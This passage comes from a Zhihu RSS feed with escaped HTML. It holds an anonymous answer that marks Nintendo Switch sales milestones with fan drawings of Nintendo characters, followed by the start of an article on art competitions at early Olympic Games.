data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-b4941391c25fa167c5f5269be2c3ad45\" data-watermark-src=\"v2-2443f779a45575d6ac0e0fa42ed4a63c\" data-private-watermark-src=\"v2-ee3ae8ac2527c26bb6466b79b892e4e6\"></p>\n<p>财报更新了，目前5577万。</p>\n<p>5300万突破的罗伊·阿夸·库巴</p>\n<p><img src=\"https://pic3.zhimg.com/v2-02cfe45c2d6a5ff805df3180039a6799_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-02cfe45c2d6a5ff805df3180039a6799\" data-watermark-src=\"v2-0cf443a06cedc28ef5e55e9bb3f1218b\" data-private-watermark-src=\"v2-5dee1b4238d232686bdb3e675f8b7b2a\" data-tags=\"politic\"></p>\n<p>5400万突破的初代林克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1f9c595e2bc4f4e8ec212dbfc1847c31_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1f9c595e2bc4f4e8ec212dbfc1847c31\" data-watermark-src=\"v2-17cb54ac8696d41ebfe4aed29ee6fe9b\" data-private-watermark-src=\"v2-2dc9b3cb474f37f192c3e56ebc690316\"></p>\n<p>5500万突破的小麦克</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4a14e1f8a7019850a2e6074fcceefb9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-e4a14e1f8a7019850a2e6074fcceefb9\" data-watermark-src=\"v2-93d3c9cdbd6be2e7f438db7cd9b5a9d2\" data-private-watermark-src=\"v2-0d12380b8963c5ad3de55277cd57eb8b\"></p>\n<p> 任天堂新财报出炉，硬件销量累计6144万台。</p>\n<p>5600万突破的《打鸭子》里的狗。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-34800cf72d395278192a449fdab15fb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-34800cf72d395278192a449fdab15fb4\" data-watermark-src=\"v2-7d1c6cc6d39d2c640437781627e23906\" data-private-watermark-src=\"v2-350f7ba3a744abf92073941d56990587\"></p>\n<p>5700万突破的大库巴。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3480d71eab7a33d784c3ae5c7ccf73c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3480d71eab7a33d784c3ae5c7ccf73c2\" data-watermark-src=\"v2-43671d455892d4f7c17649c8f35c3ef6\" data-private-watermark-src=\"v2-fc50e92beba929d596921cbc51184ba3\"></p>\n<p>5800万突破的初代塞尔达公主。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b699e71ff18611272d87c9dab241f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-b699e71ff18611272d87c9dab241f365\" data-watermark-src=\"v2-5b4694e35ff429dab96642d2933fba0d\" data-private-watermark-src=\"v2-05ff01512c1c3b5fa32a4c48d6c27d19\"></p>\n<p>5900万突破的……“公主在另一个城堡”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4d4dff3b84870f453a689bbcd12f2f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4d4dff3b84870f453a689bbcd12f2f\" data-watermark-src=\"v2-2a084da290cd5f0d9576cbe3877ab809\" data-private-watermark-src=\"v2-c7fffa18dc06036fbabd43e6e1339f15\" data-tags=\"politic\"></p>\n<p>6000万突破的DONKEY KONG X 凑阿夸</p>\n<p><img src=\"https://pic3.zhimg.com/v2-75d04349ee9d4784f55eadb4ab8eafca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-75d04349ee9d4784f55eadb4ab8eafca\" data-watermark-src=\"v2-47f2a86f52169155ba5bb33081fbfb44\" data-private-watermark-src=\"v2-189e7b375401321be63bc50717a90aec\"></p>\n<p>6100万突破的《MOTHER》初代主角：NINTEN</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f566941b5a0bacd5c09a8b69a1b4ca89_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f566941b5a0bacd5c09a8b69a1b4ca89\" data-watermark-src=\"v2-0f343fb74aa79ef9222140944ede4f86\" data-private-watermark-src=\"v2-ab8892c93527abbfe8c7161e69bea803\"></p>\n<p>任天堂新财报出炉，硬件销量累计6830万台。</p>\n<p>因为这次有人提醒所以提前几天就画了……到家后传上来吧。</p>\n<p>这次我猜得挺准的……</p>\n<p>6200万突破的卡比（卡比的造型是真好画啊……）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4803c93cc89ab7038c0e50efcabcf284_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4803c93cc89ab7038c0e50efcabcf284\" data-watermark-src=\"v2-05307b92cfd5cd1ec15163ac2fd10706\" data-private-watermark-src=\"v2-77bec68f4d48ddeb9e64d6b9889ee2ef\"></p>\n<p>6300万突破的马里奥系列经典家门怪酷栗宝。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3016f768a9d2caa844ad73888afb9bba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3016f768a9d2caa844ad73888afb9bba\" data-watermark-src=\"v2-4aaf71c3a15df5f274d1609204799d0e\" data-private-watermark-src=\"v2-aff026e2ef5922fc1b5dc340bb9eedcb\"></p>\n<p>6400万突破的塞尔达传说系列人气角色……汀格尔（不过气球装的来源是DS上的汀格尔气球大战）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f44b617999b0a5fd1955a4970bba2d4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f44b617999b0a5fd1955a4970bba2d4c\" data-watermark-src=\"v2-9a88e892a4097e9b1b0ae448df9e88ea\" data-private-watermark-src=\"v2-f639da87b33cf41809fbf8148251ca7d\"></p>\n<p>6500万突破的火焰之纹章初代男主马尔斯。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4fc800703398b2206fc5b0f0b6832665_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4fc800703398b2206fc5b0f0b6832665\" data-watermark-src=\"v2-44fecc7621f294be30e695c0c455631b\" data-private-watermark-src=\"v2-9ee0629b4f51859c72a4007b95ab209f\"></p>\n<p>6600万突破的塞尔达传说风之杖的BOSS加农。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-eb9869674e2a8829c733e496254c98b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-eb9869674e2a8829c733e496254c98b0\" data-watermark-src=\"v2-f0a86545a27a07766da8008c3c48672f\" data-private-watermark-src=\"v2-e668ab9e0e768590bf17ecf7eff1b04b\"></p>\n<p>6700万突破的银河战士系列主角萨姆斯。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-81e3fe5406082c4c3eeb50a962907a8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-81e3fe5406082c4c3eeb50a962907a8f\" data-watermark-src=\"v2-55eec70f197b516504dca4c76d2a9658\" data-private-watermark-src=\"v2-3e2f1cc0417f0ead4bfc87a202140399\"></p>\n<p>6800万突破的马里奥系列老二哥路易。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c867c6fd6d65b4cbfe181a31cf1d2e68_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-c867c6fd6d65b4cbfe181a31cf1d2e68\" data-watermark-src=\"v2-cb561b7ec9113cbbcecc0f9b22a08f62\" data-private-watermark-src=\"v2-c9a298d2a93c72d3c6f135c4051d26f6\"></p>\n<p>任天堂新财报出炉，硬件销量累计7987万台。</p>\n<p>虽然提前画了些但少估了200万，到家后快点画完补上两张……</p>\n<p>6900万突破的马里奥系列经典怪德哥（其实叫锤子兄弟……）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8b2f990ffec63361f15bd33026411289_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8b2f990ffec63361f15bd33026411289\" data-watermark-src=\"v2-e52ac808c5436d3e2f3de80d209f0b64\" data-private-watermark-src=\"v2-65bbca677355c656e282506641a2a306\"></p>\n<p>7000万突破的老娘经典怪星人</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d1c6548698743b1ef4c4287603c64cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-0d1c6548698743b1ef4c4287603c64cd\" data-watermark-src=\"v2-cd1a2522295b09ea4464f0e3300577cb\" data-private-watermark-src=\"v2-ad4dbba6397b9f6335b3a183fd8fb99e\"></p>\n<p>7100万突破的纸马折纸王国的炸弹彬</p>\n<p><img src=\"https://pic4.zhimg.com/v2-226f2adb536326398924c042bbb75602_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-226f2adb536326398924c042bbb75602\" data-watermark-src=\"v2-b391eeeab09d63f2b6f4e06e0a34e4f0\" data-private-watermark-src=\"v2-4a5afc5a0f16cfea629c8010b4d2ec9c\"></p>\n<p>7200万突破的F-ZERO猎鹰队长</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4847300494463862f509f3cbf9c5d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4847300494463862f509f3cbf9c5d2\" data-watermark-src=\"v2-adbd433b35e540fb347ba458cb07c75b\" data-private-watermark-src=\"v2-2814d104d864e374c1980d59d9f5b5c9\"></p>\n<p>7300万突破的口袋妖怪经典PM鲤鱼王</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1e278a6a9f60a043bbbb7857a927edf3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-1e278a6a9f60a043bbbb7857a927edf3\" data-watermark-src=\"v2-11f2f41b0bb6487694ac3475f889fa7d\" data-private-watermark-src=\"v2-2504c7a60907cfb9a886c05a7288404f\"></p>\n<p>7400万突破的魔法假日女主角</p>\n<p><img src=\"https://pic3.zhimg.com/v2-575443f7856df5a41c3126730b52102a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-575443f7856df5a41c3126730b52102a\" data-watermark-src=\"v2-b351c118ae00d047f9ca4c16084d86eb\" data-private-watermark-src=\"v2-d814264ddea00c0c4b3768e5b7fa97b0\"></p>\n<p>7500万突破的塞尔达时之笛傲娇佐拉小公主露塔</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d7f34f8247ff89807684c4a587bc6eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-d7f34f8247ff89807684c4a587bc6eb4\" data-watermark-src=\"v2-45c1ebafe29ac4a705d870b80416d8a2\" data-private-watermark-src=\"v2-9eccac143414d4a8978d64b1ec8072cd\"></p>\n<p>7600万突破的口袋妖怪PM 巨钳螳螂</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fb76ae1344f27a277a0dc219d1c0e323_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-fb76ae1344f27a277a0dc219d1c0e323\" data-watermark-src=\"v2-e88360ee0d8a0fea1e9700e2182d02d6\" data-private-watermark-src=\"v2-8a380a6430863c1ffee7c6134ca33836\"></p>\n<p>7700万突破的动物之森恶毒资本家狸克</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3a0becf83c4f72e574f361e50e78b34d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3a0becf83c4f72e574f361e50e78b34d\" data-watermark-src=\"v2-edf5e367e272d180696c5ba4ab650bf3\" data-private-watermark-src=\"v2-78ace80e99951ca815f1d7e9be2b3a9f\"></p>\n<p>7800万突破的皮克敏主角奥利马</p>\n<p><img src=\"https://pic2.zhimg.com/v2-71e28f8a0385653c4bd5fe662b7a2930_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-71e28f8a0385653c4bd5fe662b7a2930\" data-watermark-src=\"v2-5c39930229a2fb2f84ab0fb6dc42d29f\" data-private-watermark-src=\"v2-0b4139cb2baa1a72f4b89535bcba2237\"></p>\n<p>7900万突破的黄金太阳米雅莉</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4127f601aab0aa6a957275417cb2484a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4127f601aab0aa6a957275417cb2484a\" data-watermark-src=\"v2-4ae487bb7391aea965d9fe40e010dd06\" data-private-watermark-src=\"v2-dc881b0ee2444af0c2fa03a2d344868d\"></p>\n<p>……躺着也赚爆，ND还会开吗。</p>\n<p> 任天堂财报出炉，截止2021年3月31日：NS硬件销量累计8459万台。</p>\n<p>最近痛风（不是MHR）中只能保持着一个难受的姿势画图，没什么耐心就偷了一些工……</p>\n<p>8000万突破的马里奥系列的黛西公主。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2b1107350eb990c83225ee4f616e0202_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-2b1107350eb990c83225ee4f616e0202\" data-watermark-src=\"v2-a0486a36b1dccaf4efc199ec31f65d1e\" data-private-watermark-src=\"v2-90bcb7669e244cbaa419957b98de4186\"></p>\n<p>8100万突破的健身环BOSS堕拉贡，顺便庆贺健身环突破1000万销量。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc89fc783f84f45405a049b65593e926_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1100\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-dc89fc783f84f45405a049b65593e926\" data-watermark-src=\"v2-4a6d9eba1d4fdd222091e0d684483737\" data-private-watermark-src=\"v2-d03dbb1f838f5d4448284212ffed6c27\"></p>\n<p>8200万突破的口袋妖怪大朝北鼻</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f71f639f10888c3781d5d938aee51718_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f71f639f10888c3781d5d938aee51718\" data-watermark-src=\"v2-6170a25880e687ef62a8ada01da4a324\" data-private-watermark-src=\"v2-37ba9ea174ce13053c19a3c1bbc33922\"></p>\n<p>8300万突破的迪迪刚</p>\n<p><img src=\"https://pic4.zhimg.com/v2-48a68a8f1a13c99de91f55b962c6616b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-48a68a8f1a13c99de91f55b962c6616b\" data-watermark-src=\"v2-eb1e481256fcfb6ff74d1c139b30783d\" data-private-watermark-src=\"v2-946769d6fbfc45f44a13872cb77d3687\"></p>\n<p>8400万突破的火纹初代女主希达</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f1d6481f538b2d400c7d1d4fbe65980e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f1d6481f538b2d400c7d1d4fbe65980e\" data-watermark-src=\"v2-8a542c9eb9fd526432313aa4313599a8\" data-private-watermark-src=\"v2-35da410d847903c36d70c7c03bdac238\"></p>\n<p>该忏悔了……</p>\n<p>任天堂财报出炉，截止2021年6月30日：NS硬件销量累计8904万台。</p>\n<p>这次有之前多画的凑数，倒是省事……</p>\n<p>8500万突破的零装萨姐</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f2b2f55f11a627558080182c5ef7eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-5f2b2f55f11a627558080182c5ef7eb4\" data-watermark-src=\"v2-9ce5618b77239810a63041682f53d18b\" data-private-watermark-src=\"v2-bc6166d27a756bb07139b9865dfd83d5\"></p>\n<p>8600万突破的马里奥系列炮弹刺客</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8e716ed1ecb8ea2439acc0a39ccfdf3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8e716ed1ecb8ea2439acc0a39ccfdf3b\" data-watermark-src=\"v2-f6745518de669ccc4d63fa490499c0d1\" data-private-watermark-src=\"v2-869e94fce98da02f7b0eb847accf3121\"></p>\n<p>8700万突破的金属之光主角老妹日向梓</p>\n<p><img src=\"https://pic2.zhimg.com/v2-55557db03287da3fdde7cfe83a21ee4d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-55557db03287da3fdde7cfe83a21ee4d\" data-watermark-src=\"v2-f2ba8b2c7b7c006c73c963d9cae0b286\" data-private-watermark-src=\"v2-1c8738f450b05cb665b410f86de18304\"></p>\n<p>8800万突破的赫拉克罗斯</p>\n<p><img src=\"https://pic1.zhimg.com/v2-433f189074bc85d487d260c8b2c3a9de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-433f189074bc85d487d260c8b2c3a9de\" data-watermark-src=\"v2-c21118e69d7de503ef0128763e490da7\" data-private-watermark-src=\"v2-958bbdc57fff20166edfd779cec3417c\"></p>\n<p>8900万突破的面具商人（这个角色真是塞尔达系列里最让我感觉渗人的……某种意义上的童年阴影）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cbf965782065bc781bc2f655b2a95ab7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-cbf965782065bc781bc2f655b2a95ab7\" data-watermark-src=\"v2-0d5a9b7de29293b5e3807e3741a9bbf8\" data-private-watermark-src=\"v2-d83c9587d4b538306efb20b796130bc3\"></p>\n<p>这次硬件销量同比缩水，爆杀古川，该来点大的了吧！（但其实是去年动森太猛了，恐怕古川还要继续躺……）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">匿名用户</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">190 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/297478327?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价switch2019年推出的升级版？</a><br><a href=\"http://www.zhihu.com/question/286061729?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">年龄大了玩 Switch 什么感受？</a><br>\n","link":"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如果艺术家也能角逐奥运金牌……","date":"2021-08-05 09:34:13","description":"\n<p>1908年奥运会，沃尔特·威南斯代表美国队出赛，赢得了射击项目金牌。他在1912年又一次参加奥运会，并且除射击之外，还参加了另一个项目，并赢得金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_b.jpg\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1532\" class=\"origin_image zh-lightbox-thumb\" width=\"2048\" data-original=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_r.jpg\"><figcaption>沃尔特·威南斯</figcaption></figure><p>问：沃尔特·威南斯参加的是什么项目？</p>\n<ul>\n<li>A，马术</li>\n<li>B，游泳</li>\n<li>C，唱歌</li>\n<li>D，雕塑</li>\n</ul>\n<p>要是按照以往做选择题的经验，我们肯定先排除两个明显和题干奥运会无关的选项唱歌和雕塑，然后再考虑，射击、游泳和马术都包含在现代五项里面，不太好选，但看照片这位老人家颇有一幅西部片里面警长的样子，肯定会骑马，不一定会游泳，所以答案应该是A，马术？</p>\n<p>很遗憾，答案是D。他的金牌的确和马有关，但并不是马术，而是……一件青铜雕塑——《美国快步马》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_b.jpg\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_r.jpg\"><figcaption>沃尔特·威南斯，《美国快步马》</figcaption></figure><p>是的，当年的奥运会，曾经是比雕塑的。而且不光有雕塑，还有绘画、建筑、音乐和文学，一比就是几十年。</p>\n<p>在奥运会搞艺术大奖赛这事儿确实不是瞎折腾，而是现代奥林匹克运动会的创始人皮埃尔·德·顾拜旦的主意。早在1894年头一回奥运会之后，顾拜旦就觉得不过瘾，不够劲儿。他觉得世界大同光靠体育的交流还是不够，还需要有心灵的交流，心灵交流就要靠艺术。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"965\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_r.jpg\"><figcaption>顾拜旦男爵皮埃尔·德·弗雷迪</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"767\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_r.jpg\"><figcaption>顾拜旦的《奥林匹克宣言》手稿于2019年经苏富比拍卖，以6160万元成交。</figcaption></figure><p>于是，当1912年斯德哥尔摩承办奥运会的时候，顾拜旦就说，咱那些体育项目：田径、体操、帆船、马术……照常比，再加几条艺术的呗。斯德哥尔摩一开始是很不情愿的，但是最终还是同意增设绘画、雕塑、建筑、音乐、文学五个领域，各设金银铜牌。舞蹈、电影和摄影等形式一度也被纳入考量范围，但最终没有被采纳。参赛作品的体裁不限，但有一个要求——必须呼应体育运动主题和奥林匹克精神。</p>\n<p>这就有了前面咱们说的双料冠军沃尔特·威南斯，一个人赢下射击和雕塑两项金牌的逸事了。不过，老实说咱们这位奥运金牌得主并不是特别有名的艺术家，他的雕塑作品也是中规中矩。之所以他赢得金牌，其实也是矮子里面拔高个，第一届有艺术赛事的奥运会，五个项目加起来，才总共只有35人报名参加，按最终颁发15枚奖牌计算，等于每两个半人就能匀到一枚奖牌，竞争激烈程度比跑步、跳高可是低多了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1082\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_r.jpg\"><figcaption>1912年斯德哥尔摩奥运会海报，图画作者为奥洛夫·霍茲伯格，他的这幅画并没有参赛获奖</figcaption></figure><p>虽说一开始艺术赛事的热度不高，但顾拜旦并不打算就此打住。在接下来的几十年里，艺术赛事的参与度逐年增高，到1924年的时候，已经有193位各界艺术家参赛了，而竞赛项目也开始细分，绘画分出了油画、水彩素描、版画；建筑奖项分成两项：建筑和城市规划。只不过这两个类别有时候实在很难区分，有时候干脆会把这两个奖颁给同一个建筑作品。</p>\n<p>文学分出了戏剧、史诗和诗歌——这项赛事的参赛者必须使用英语或者法语参赛。有意思的是，咱们的顾拜旦爵爷为了炒高比赛热度，还曾使用化名乔治·欧罗德和马丁·艾芬巴赫参加诗歌项目赛事，最后乔治·欧罗德还真的赢了一枚金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6a828dfff444c76015fdc9e646560bc_b.jpg\" data-size=\"normal\" data-rawwidth=\"320\" data-rawheight=\"320\" class=\"content_image\" width=\"320\"><figcaption>1924年巴黎奥运会金牌，可以看到左下角包含有竖琴等和艺术有关的元素</figcaption></figure><p>音乐赛事虽然分出了管弦乐、独奏和人声，但其实这些作品都是以乐谱的形式递交给组委会的，并不是像今天的选秀节目那样由乐手现场表演给评委。尽管评委们并非等闲之辈——音乐赛事评委中包括有伊戈尔·斯特拉文斯基这样的乐坛传奇，文学评委包括诺贝尔文学奖得主塞尔玛·拉格洛夫等，但在面对这「一页页」奥运选手时，评委们难免因艺术主张的分歧而难以达成共识。事实上，斯特拉文斯基担任音乐赛事评委的1924年奥运会根本没有颁发任何音乐奖牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_r.jpg\"><figcaption>斯特拉文斯基的作品如《火鸟》、《春之祭》至今仍会在奥运会花样滑冰等赛事的配乐中出现</figcaption></figure><p>当然，颁不出奖一个原因可能是评委的标准高，另一个原因也是因为很多名声在外的艺术大师不太愿意参赛。这一时期咱们能叫得出名字的那些艺术家，比如毕加索、马蒂斯……全都没参加奥运会。一些艺术家不愿意和其他自己看不上的艺术家同台竞技，另有些艺术家不太愿意迎合奥运会的套路去命题作文——很多参加绘画赛事的艺术家为了能够吸引评委的眼球，都会选择绘制紧张刺激的拳击、橄榄球等主题作品。历史上唯一一位两届奥运会绘画金牌得主让·雅可比的得奖作品便是描绘足球运动中前锋和守门员争球的《角球》和橄榄球运动员激烈拼抢的《橄榄球》。它们为他分别赢得了一枚综合绘画金牌和素描金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_b.jpg\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"700\" class=\"origin_image zh-lightbox-thumb\" width=\"448\" 